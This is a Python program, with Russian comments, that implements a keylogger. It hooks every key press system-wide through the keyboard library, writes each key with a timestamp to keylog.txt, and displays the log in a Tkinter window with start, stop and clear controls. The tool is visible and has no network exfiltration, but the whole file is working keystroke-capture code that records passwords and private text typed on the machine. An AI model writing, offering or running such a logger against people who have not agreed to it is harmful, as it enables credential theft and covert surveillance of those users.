import tkinter as tk
from tkinter import scrolledtext, messagebox
import threading
import keyboard
from datetime import datetime

class KeyloggerGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Keylogger GUI")
        self.root.geometry("600x400")
        
        self.is_logging = False
        self.log_file = "keylog.txt"
        
        self.setup_ui()
        
    def setup_ui(self):
        # Кнопки управления
        btn_frame = tk.Frame(self.root)
        btn_frame.pack(pady=10)
        
        self.start_btn = tk.Button(btn_frame, text="Старт", command=self.start_logging, bg="green", fg="white")
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(btn_frame, text="Стоп", command=self.stop_logging, bg="red", fg="white", state="disabled")
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = tk.Button(btn_frame, text="Очистить", command=self.clear_log)
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Статус
        self.status_label = tk.Label(self.root, text="Статус: Остановлен", font=("Arial", 10))
        self.status_label.pack(pady=5)
        
        # Текстовое поле для отображения логов
        self.text_area = scrolledtext.ScrolledText(self.root, height=20, width=70)
        self.text_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
        
        # Загружаем существующий лог
        self.load_log()
        
    def on_key_press(self, event):
        """Обработчик нажатий клавиш"""
        if self.is_logging:
            timestamp = datetime.now().strftime("%H:%M:%S")
            log_entry = f"[{timestamp}] {event.name}\n"
            
            # Записываем в файл
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
            # Обновляем GUI
            self.root.after(0, lambda: self.text_area.insert(tk.END, log_entry))
            self.root.after(0, lambda: self.text_area.see(tk.END))
    
    def start_logging(self):
        """Запуск логирования"""
        self.is_logging = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.status_label.config(text="Статус: Запущен", fg="green")
        
        # Запускаем в отдельном потоке
        self.logging_thread = threading.Thread(target=self.run_keylogger, daemon=True)
        self.logging_thread.start()
    
    def run_keylogger(self):
        """Запуск кейлогера в отдельном потоке"""
        keyboard.on_press(self.on_key_press)
        while self.is_logging:
            keyboard.wait(0.1)
    
    def stop_logging(self):
        """Остановка логирования"""
        self.is_logging = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.status_label.config(text="Статус: Остановлен", fg="red")
        keyboard.unhook_all()
    
    def clear_log(self):
        """Очистка лога"""
        if messagebox.askyesno("Подтверждение", "Очистить весь лог?"):
            self.text_area.delete(1.0, tk.END)
            open(self.log_file, "w").close()
    
    def load_log(self):
        """Загрузка существующего лога"""
        try:
            with open(self.log_file, "r", encoding="utf-8") as f:
                content = f.read()
                self.text_area.insert(tk.END, content)
                self.text_area.see(tk.END)
        except FileNotFoundError:
            pass
    
    def run(self):
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.mainloop()
    
    def on_closing(self):
        """Обработка закрытия окна"""
        if self.is_logging:
            self.stop_logging()
        self.root.destroy()

if __name__ == "__main__":
    app = KeyloggerGUI()
    app.run()